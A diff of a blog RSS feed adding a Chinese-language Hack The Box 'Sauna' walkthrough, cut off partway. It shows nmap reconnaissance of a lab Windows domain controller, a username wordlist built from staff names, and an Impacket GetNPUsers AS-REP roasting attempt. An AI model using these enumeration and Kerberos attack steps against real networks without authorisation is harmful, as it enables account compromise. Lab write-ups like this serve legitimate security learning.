@@ -5,8 +5,668 @@
         <description>Recent content in Posts on Welcome My Hack&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 20 Apr 2026 14:00:00 +0800</lastBuildDate>
+        <lastBuildDate>Tue, 21 Apr 2026 17:00:00 +0800</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB-Sauna Writeup</title>
+            <link>http://localhost:1313/posts/htb-sauna-writeup/</link>
+            <pubDate>Tue, 21 Apr 2026 17:00:00 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/htb-sauna-writeup/</guid>
+            <description>&lt;h2 id=&#34;初始侦察&#34;&gt;初始侦察&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-端口扫描&#34;&gt;Nmap 端口扫描&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Sauna&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; -p- 10.129.22.120 -oA Nmap/ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sudo&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; kali: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.98 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-04-21 05:26 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.22.120
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.14s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65515&lt;/span&gt; filtered tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT      STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;53/tcp    open  domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp    open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;88/tcp    open  kerberos-sec
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;135/tcp   open  msrpc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;139/tcp   open  netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;389/tcp   open  ldap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;445/tcp   open  microsoft-ds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;464/tcp   open  kpasswd5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;593/tcp   open  http-rpc-epmap
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;636/tcp   open  ldapssl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3268/tcp  open  globalcatLDAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3269/tcp  open  globalcatLDAPssl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5985/tcp  open  wsman
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;9389/tcp  open  adws
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49667/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49673/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49674/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49677/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49689/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;49698/tcp open  unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 20.87 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提取端口做备用。&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.22.120 -oA Nmap/ports
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-21 05:26 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.22.120
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65515</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown
+</span></span><span style="display:flex;"><span>49673/tcp open  unknown
+</span></span><span style="display:flex;"><span>49674/tcp open  unknown
+</span></span><span style="display:flex;"><span>49677/tcp open  unknown
+</span></span><span style="display:flex;"><span>49689/tcp open  unknown
+</span></span><span style="display:flex;"><span>49698/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.87 seconds
+</span></span></code></pre></div><p>提取端口做备用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep open Nmap/ports.nmap | awk -F <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> | paste -sd <span style="color:#e6db74">&#39;,&#39;</span> 
+</span></span><span style="display:flex;"><span>53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49698
+</span></span></code></pre></div><h3 id="nmap-详细信息扫描">Nmap 详细信息扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49698 10.129.22.120                                                                                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-21 05:28 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.22.120
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: Egotistical Bank :: Home
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-04-21 16:28:15Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49674/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49689/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49698/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2019|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> - 21H1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-04-21T16:29:10
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3.1.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: 7h00m00s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 107.65 seconds
+</span></span></code></pre></div><p>这是个域机器，添加 <code>hosts</code> 解析</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.22.120 egotistical-bank.local&#34; &gt;&gt; /etc/hosts&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>                                                                                                                              
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.22.120 egotistical-bank.local
+</span></span></code></pre></div><h2 id="web-80-渗透">Web-80 渗透</h2>
+<p>访问 80 界面，浏览发现很多人名，保存为一个字典。</p>
+<p><img src="Pasted%20image%2020260421174938.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim users.txt           
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.txt               
+</span></span><span style="display:flex;"><span>Fergus Smith
+</span></span><span style="display:flex;"><span>Shaun Coins
+</span></span><span style="display:flex;"><span>Hugo Bear
+</span></span><span style="display:flex;"><span>Bowie Taylor
+</span></span><span style="display:flex;"><span>Sophie Driver
+</span></span><span style="display:flex;"><span>Steven Kerb
+</span></span></code></pre></div><p>进一步扩展字典。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.txt 
+</span></span><span style="display:flex;"><span>Fergus Smith
+</span></span><span style="display:flex;"><span>Shaun Coins
+</span></span><span style="display:flex;"><span>Hugo Bear
+</span></span><span style="display:flex;"><span>Bowie Taylor
+</span></span><span style="display:flex;"><span>Sophie Driver
+</span></span><span style="display:flex;"><span>Steven Kerb
+</span></span><span style="display:flex;"><span>fergus
+</span></span><span style="display:flex;"><span>smith
+</span></span><span style="display:flex;"><span>shaun
+</span></span><span style="display:flex;"><span>coins
+</span></span><span style="display:flex;"><span>hugo
+</span></span><span style="display:flex;"><span>bear
+</span></span><span style="display:flex;"><span>bowie
+</span></span><span style="display:flex;"><span>taylor
+</span></span><span style="display:flex;"><span>sophie
+</span></span><span style="display:flex;"><span>driver
+</span></span><span style="display:flex;"><span>steven
+</span></span><span style="display:flex;"><span>kerb
+</span></span></code></pre></div><p>查看 Kerberos 域认证。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>                                                                                           
+</span></span><span style="display:flex;"><span>└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass  -dc-ip 10.129.22.120 egotistical-bank.local/ -usersfile users.txt 
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>爆破失败，是不是字典的原因？再次扩充字典。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.txt 
+</span></span><span style="display:flex;"><span>Fergus Smith
+</span></span><span style="display:flex;"><span>Shaun Coins
+</span></span><span style="display:flex;"><span>Hugo Bear
+</span></span><span style="display:flex;"><span>Bowie Taylor
+</span></span><span style="display:flex;"><span>Sophie Driver
+</span></span><span style="display:flex;"><span>Steven Kerb
+</span></span><span style="display:flex;"><span>fergus
+</span></span><span style="display:flex;"><span>smith
+</span></span><span style="display:flex;"><span>shaun
+</span></span><span style="display:flex;"><span>coins
+</span></span><span style="display:flex;"><span>hugo
+</span></span><span style="display:flex;"><span>bear
+</span></span><span style="display:flex;"><span>bowie
+</span></span><span style="display:flex;"><span>taylor
+</span></span><span style="display:flex;"><span>sophie
+</span></span><span style="display:flex;"><span>driver
+</span></span><span style="display:flex;"><span>steven
+</span></span><span style="display:flex;"><span>kerb
+</span></span><span style="display:flex;"><span>fergussmith
+</span></span><span style="display:flex;"><span>shauncoins
+</span></span><span style="display:flex;"><span>hugobear
+</span></span><span style="display:flex;"><span>bowietylor
+</span></span><span style="display:flex;"><span>sophiedriver
+</span></span><span style="display:flex;"><span>stevenkerb
+</span></span><span style="display:flex;"><span>administrator
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>guest
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>fergus
+</span></span><span style="display:flex;"><span>Fergus
+</span></span><span style="display:flex;"><span>smith
+</span></span><span style="display:flex;"><span>Smith
+</span></span><span style="display:flex;"><span>fsmith
+</span></span><span style="display:flex;"><span>FSmith
+</span></span><span style="display:flex;"><span>Fsmith
+</span></span><span style="display:flex;"><span>smithf
+</span></span><span style="display:flex;"><span>SmithF
+</span></span><span style="display:flex;"><span>fergus.smith
+</span></span><span style="display:flex;"><span>Fergus.Smith
+</span></span><span style="display:flex;"><span>fergussmith
+</span></span><span style="display:flex;"><span>FergusSmith
+</span></span><span style="display:flex;"><span>f.smith
+</span></span><span style="display:flex;"><span>F.Smith
+</span></span><span style="display:flex;"><span>smith.f
+</span></span><span style="display:flex;"><span>Smith.F
+</span></span><span style="display:flex;"><span>shaun
+</span></span><span style="display:flex;"><span>Shaun
+</span></span><span style="display:flex;"><span>coins
+</span></span><span style="display:flex;"><span>Coins
+</span></span><span style="display:flex;"><span>scoins
+</span></span><span style="display:flex;"><span>SCoins
+</span></span><span style="display:flex;"><span>Scoins
+</span></span><span style="display:flex;"><span>coinss
+</span></span><span style="display:flex;"><span>shaun.coins
+</span></span><span style="display:flex;"><span>Shaun.Coins
+</span></span><span style="display:flex;"><span>shauncoins
+</span></span><span style="display:flex;"><span>ShaunCoins
+</span></span><span style="display:flex;"><span>s.coins
+</span></span><span style="display:flex;"><span>S.Coins
+</span></span><span style="display:flex;"><span>hugo
+</span></span><span style="display:flex;"><span>Hugo
+</span></span><span style="display:flex;"><span>bear
+</span></span><span style="display:flex;"><span>Bear
+</span></span><span style="display:flex;"><span>hbear
+</span></span><span style="display:flex;"><span>HBear
+</span></span><span style="display:flex;"><span>Hbear
+</span></span><span style="display:flex;"><span>bearh
+</span></span><span style="display:flex;"><span>hugo.bear
+</span></span><span style="display:flex;"><span>Hugo.Bear
+</span></span><span style="display:flex;"><span>hugobear
+</span></span><span style="display:flex;"><span>HugoBear
+</span></span><span style="display:flex;"><span>h.bear
+</span></span><span style="display:flex;"><span>H.Bear
+</span></span><span style="display:flex;"><span>bowie
+</span></span><span style="display:flex;"><span>Bowie
+</span></span><span style="display:flex;"><span>taylor
